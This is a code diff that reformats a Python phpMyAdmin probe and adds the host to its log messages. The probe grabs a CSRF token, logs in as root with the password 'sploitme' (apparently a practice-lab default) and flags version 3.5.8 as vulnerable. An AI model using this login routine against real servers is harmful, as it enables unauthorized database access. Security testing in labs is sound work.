@@ -5,6 +5,7 @@ import argparse
 from bs4 import BeautifulSoup
 
 import logging
+
 log = logging.getLogger(__name__)
 
 
@@ -17,28 +18,30 @@ class PHPMyAdmin:
         self.__requests = requests.session()
 
     def __csrf(self):
-        log.debug("[!] Getting CSRF Token")
+        log.debug(f"[!] Getting CSRF Token ({self.__host})")
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
-        soup = BeautifulSoup(r.text, 'lxml')
-        self.__token = soup.select_one('input[name="token"]')['value']
+        soup = BeautifulSoup(r.text, "lxml")
+        self.__token = soup.select_one('input[name="token"]')["value"]
 
     def __exploit(self):
         params = {
             "pma_username": "root",
             "pma_password": "sploitme",
             "server": "1",
-            "token": self.__token
+            "token": self.__token,
         }
-        r  = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__path}", params=params)
+        r = self.__requests.post(
+            f"http://{self.__host}:{self.__port}{self.__path}", params=params
+        )
         if r.status_code != 200:
-            log.info("[*] Error logging into PHPMyAdmin")
+            log.info(f"[*] Error logging into PHPMyAdmin ({self.__host})")
             return False
-        soup = BeautifulSoup(r.text, 'lxml')
+        soup = BeautifulSoup(r.text, "lxml")
         title = soup.find("title").text
         if "phpMyAdmin 3.5.8" in title:
-            log.info("[!] PHPMyAdmin is vulnerable")
+            log.info(f"[!] PHPMyAdmin is vulnerable ({self.__host})")
             return True
-        log.info("[!] PHPMyAdmin is secure")
+        log.info(f"[!] PHPMyAdmin is secure ({self.__host})")
         return False
 
     def run(self, host, port=None):
